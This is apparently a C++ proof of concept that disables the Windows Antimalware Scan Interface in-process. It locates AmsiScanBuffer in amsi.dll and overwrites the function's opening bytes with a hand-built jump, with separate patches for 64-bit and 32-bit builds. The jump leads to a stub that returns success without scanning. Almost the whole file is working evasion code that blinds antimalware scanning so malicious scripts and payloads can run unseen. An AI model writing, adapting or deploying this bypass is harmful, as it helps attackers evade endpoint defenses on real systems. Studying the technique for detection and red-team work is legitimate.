#include "Header.h"

int __stdcall HookedAmsi(HAMSICONTEXT amsiContext,PVOID buffer,	ULONG length,LPCWSTR contentName,HAMSISESSION amsiSession,AMSI_RESULT* result) {
	std::cout << "Fuck AMSI, it's working" << std::endl;

	return 0;
}

int main() {
	// Get address for AmsiScanBuffer
	HMODULE AmsiDLLHandle = LoadLibraryA("amsi.dll");
	FARPROC AmsiScanBufferAddress = GetProcAddress(AmsiDLLHandle, "AmsiScanBuffer");

	HANDLE currentProcessHandle = GetCurrentProcess();
	
	char OriginalAmsiAddress[8] = { 0 };	
	SIZE_T rBytes;
	
	// Get address for loaded amsi AmsiScanBuffer
	ReadProcessMemory(currentProcessHandle, AmsiScanBufferAddress, OriginalAmsiAddress, 8, &rBytes);
	
	std::cout << "[+] AmsiScanBuffer Address : " << AmsiScanBufferAddress << std::endl;

	void* HookedAdress = &HookedAmsi;
	std::cout << "[+] Hooked Function Address : " << HookedAdress << std::endl;

#ifdef _WIN64
	// 64 bit patch
	
	//	0x48, 0xB8, 0xC7, 0x11, 0xB4, 0x01, 0xF6, 0x7F, 0x00, 0x00, 0xFF, 0xD0
	// movabs rax, <HookedAddress>
	// call rax
	// ret
	char patch[15] = { 0 };
	memcpy_s(patch, 2, "\x48\xB8", 2);// 0
	memcpy_s(patch + 2, 8, &HookedAdress, 8);
	memcpy_s(patch + 10, 5, "\xFF\xD0\xC3\x90\x90", 5);//
#else
	// PUSH <HookedAddress>
	// ret
	char patch[6] = { 0 };
	memcpy_s(patch, 1, "\x68", 1); // x68  == PUSH
	memcpy_s(patch + 1, 4, &HookedAdress, 4);
	memcpy_s(patch + 5, 1, "\xC3", 1); // xC3  == RET
#endif
	// patch things.
	WriteProcessMemory(currentProcessHandle, (LPVOID)AmsiScanBufferAddress, patch, sizeof(patch), &rBytes);

	std::cout << "[+] Triggering AMSI Scan..." << std::endl;	
	scan();// call AmsiScanBuffer

	ExitProcess(EXIT_SUCCESS);
}